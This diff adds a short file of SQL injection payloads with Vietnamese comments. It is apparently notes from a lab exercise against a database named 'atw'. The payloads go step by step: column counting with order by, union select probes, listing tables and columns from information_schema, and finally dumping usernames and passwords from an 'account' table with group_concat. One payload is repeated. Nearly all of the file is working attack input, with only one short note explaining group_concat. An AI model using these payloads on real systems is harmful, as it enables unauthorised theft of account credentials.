@@ -1,0 +1,15 @@
+' order by 50 #
+
+' union select 1,2,3,4 #
+
+' union select 1,2,3, group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'atw' # (group_concat này để gom toàn bộ dữ liệu lấy được từ table_name thành 1 chuỗi duy nhất và trả về cho cột 4)
+
+' union select 1,2,3, group_concat(column_name) FROM information_schema.columns WHERE table_name = 'account' #
+
+' union select 1,2,3, group_concat(username,' ',password,' ') FROM account #
+
+' union select 1,2,3,
+ group_concat(table_name) FROM information_schema.tables 
+ WHERE table_schema = 'atw' 
+ # (group_concat này để gom toàn bộ dữ liệu lấy được từ table_name
+  thành 1 chuỗi duy nhất và trả về cho cột 4)
